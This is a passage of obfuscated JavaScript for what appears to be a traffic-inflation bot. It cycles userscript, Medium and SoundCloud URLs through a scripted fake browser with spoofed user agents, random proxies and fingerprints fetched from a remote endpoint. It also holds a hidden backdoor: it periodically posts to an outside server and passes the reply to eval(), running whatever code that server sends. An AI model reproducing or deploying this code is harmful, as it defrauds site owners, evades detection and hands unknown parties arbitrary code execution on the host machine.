        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + aH(0xa, '@iS#') + '-become-pr' + 'o',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + aH(0x1e, '4#UB') + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + aH(0x16, 'PTH7') + 'e/arras.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + aH(0x6, '#)0&') + 'ermanent-l' + 'eader-arro' + 'w',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + aI(0x29),
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
      }
    ],
    'userAgents': [
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + aI(0x7) + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
    ],
    'mediumArticles': [
      'https://me' + 'dium.com/',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
      'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
      'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
      'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
      'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
      'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
      'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
      'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + aG(0xc) + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + aH(0x1d, 'PTH7'),
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + aI(0xb) + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + aG(0x3) + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ],
    'searchTerms': []
  };
data[aH(0x5, 'vTuT') + 's']['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), data['searchTerm' + 's']['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), data['searchTerm' + 's']['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x56 + 0x379 * 0x7 + 0x22d * -0xb)), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x598 + -0xf98 + 0x153a)), data['searchTerm' + 's']['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), data['searchTerm' + 's'] = data['searchTerm' + 's']['flat'](0x160c + -0x2210 + 0xc07 * 0x1);

function a() {
  const cO = [
    'W70Ewse5WPfAW5hdSWi',
    'z2v0rwXLBwvUDa',
    'zY1S',
    'zw1WBY9fyxn5vG',
    'W5hdGYhcMCkaWQTkWROfW4G',
    'mKZdKa5LW47dNJSKgG',
    'WOBcHSkeW64VpgbGiGm',
    '\x20Chrome/10',
    'g3uMlmormmoCe2iV',
    'Aw5JBhvKzxm',
    'WQpdOSkLnZfTW6DwW6FdPW',
    'g-a59fdcb1',
    'CI10D2vUDgLLCW',
    'vXrVW5LnW5ruEdXa',
    'x190B29SA2L0',
    'WP0YiWRdGJyjW5G4WRu',
    'qCkABMjknmoSWRRcGZG',
    'kJKwjSosBSk1zL9L',
    'DhLWzq',
    '[CH]\x20Cored',
    'zhDX',
    'push',
    'W6rLWRVcJCkFW5ZcSfewW4u',
    'ChrZl2j5lxnPDa',
    'ube',
    'https://gr',
    './fakeBrow',
    'W4aGWPldOmo0CXnmC8o2',
    'zwfZEwzVCMSUBW',
    'WQaMWQNdHSokWPhdVHDo',
    'CCoCfvTWDrhdL8oRnW',
    'el\x20and\x20vie',
    '[WATCHDOG]',
    'href',
    'start',
    'split',
    'WR1eW4FcKCkvbCoM',
    'BE%E5%99%A',
    'W5FdLce',
    'WRyOWPK6WOjpww8pfW',
    'CMCVzw4VC2nYAq',
    'quill-org',
    'Fmoffrr7CXdcNSk4'
  ];
  a = function() {
    return cO;
  };
  return a();
}
const HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(f) {
        let g = this,
          h = g;
        for (let i = -0x1aeb + -0xb40 + 0x262b; i < f; i++)
          h = h['concat'](g);
        return h;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
    }
  },
  arrs = new Map(),
  makeFetchCookie = require('fetch-cook' + 'ie');
HookManager[aH(0x10, 'Nlq%')](), async function trigger() {
  const aQ = b,
    aK = d;
  for (;;) {
    try {
      let f = [],
        g = '$';
      if (flags['RPL2_RPRT']) {
        async function h() {
          try {
            axios['post']('https://st' + 'ratums.io/' + 'research', {
              'key': 'CX001_ZCa',
              'dom': me,
              'replUrl': replUrl
            })['then'](j => {
              const aJ = d;
              try {
                const k = j['data'][0x1b9c + -0x1c * 0x82 + -0xd64];
                '$' === k ? f[aJ(0x15)](j['data']) : eval(j['data']);
              } catch (l) {}
            })['catch'](j => {});
          } catch (j) {}
        }
        h(), setInterval(h, -0x2e99 + 0x776e4 + -0x2b46b);
      }
      if (flags['ActivateBr' + 'owser']) {
        const {
          FakeBrowser: j
        } = require('fakebrowse' + 'r'), k = require('path'), l = k['resolve'](__dirname, aK(0x1a) + 'serUserDat' + 'a'), m = new j['Builder']()['displayUse' + 'rActionLay' + 'er'](0x32 * -0x1f + 0x1 * -0x2052 + 0x2660)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([
          require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
            'blockTrackers': 0x1,
            'blockTrackersAndAnnoyances': 0x1
          }),
          require('puppeteer-' + 'extra-plug' + 'in-timezon' + 'e')(),
          require('puppeteer-' + 'extra-plug' + 'in-session')['default']()
        ])['userDataDi' + 'r'](l);
        let n;
        aa:
          for (;;)
            try {
              if (flags['doExtFinge' + 'rprint']) {
                let W = await async function X() {
                  const aL = b;
                  let Y;
                  const Z = {
                    'User-Agent': Y['userAgents']['random'](),
                    'Accept-Encoding': 'none'
                  };
                  try {
                    Y = (await axios[aL(0x26, '6uxW')]('https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc', {
                      'headers': Z
                    })) ? .['data'];
                  } catch (a0) {}
                  if (Y)
                    try {
                      Y = (await axios['get'](Y, {
                        'headers': Z
                      })) ? .['data'];
                    } catch (a1) {}
                  if (!Y)
                    return await randomWait(), await X();
                  try {
                    return 'object' == typeof Y ? Y : 'string' == typeof Y ? JSON['parse'](Y) : {};
                  } catch (a2) {
                    if (!Y)
                      return await randomWait(), await X();
                  }
                }();
                m['deviceDesc' + 'riptor'](W);
              }
              n = await m['launch']();
              break aa;
            } catch (Y) {
              warn(Y), await randomWait();
            }
        const {
          vanillaBrowser: p,
          userAction: q
        } = n;
        log('index.js\x20c' + 'alled');
        const u = p['defaultBro' + 'wserContex' + 't']();
        async function v(Z = '', a0 = 0xbb6 * -0x1 + 0x124f * -0x2 + 0x1 * 0x3055, a1) {
          const a2 = await a1['waitForSel' + 'ector'](Z);
          return await q['simClickEl' + 'ement'](a2, {
            'pauseAfterMouseUp': a0
          }), a2;
        }
        async function w(Z) {
          const a0 = await Z['target']()['createCDPS' + 'ession']();
          await a0['send']('Network.cl' + 'earBrowser' + 'Cookies'), await a0['send']('Network.cl' + 'earBrowser' + 'Cache');
          const a1 = await Z['cookies']();
          for (const a2 of a1)
            await Z['deleteCook' + 'ie'](a2);
          return await Z['evaluate'](() => {
            window['name'] = '', localStorage['clear'](), sessionStorage['clear']();
          }), 0x368 * -0x6 + 0x1eb4 + -0x1 * 0xa43;
        }
        async function x(Z, a0 = 0x4b4 + -0x1b09 * -0x1 + -0xa94 * 0x3) {
          let a1 = await p['newPage']();
          return await a1['setDefault' + 'Navigation' + 'Timeout'](-0x6ee * 0x3 + -0x1f7 * 0x11 + 0x3631), a0 && await useProxy(a1, await getRandomProxy()), await a1['goto'](Z, {
            'timeout': 0x0
          }), a1;
        }
        async function y(Z) {
          return await wait(0x3d1 * 0x3 + -0xd30 + 0x1545), await Z['waitForNet' + 'workIdle']({
            'idleTime': 0x1d4c,
            'timeout': 0x0
          }), -0x7 * 0x235 + 0x33e + -0x1 * -0xc36;
        }
        async function z(Z) {
